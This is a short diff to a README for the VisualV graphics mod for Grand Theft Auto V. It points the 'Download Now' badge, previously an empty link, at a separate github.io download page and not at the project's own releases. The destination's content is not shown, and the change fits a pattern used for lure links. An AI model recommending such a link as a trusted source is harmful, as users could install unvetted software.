@@ -8,7 +8,7 @@ VisualV is a graphics enhancement mod for **Grand Theft Auto V (PC)**, built to 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://visualv-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the included **OIV package** via OpenIV.  
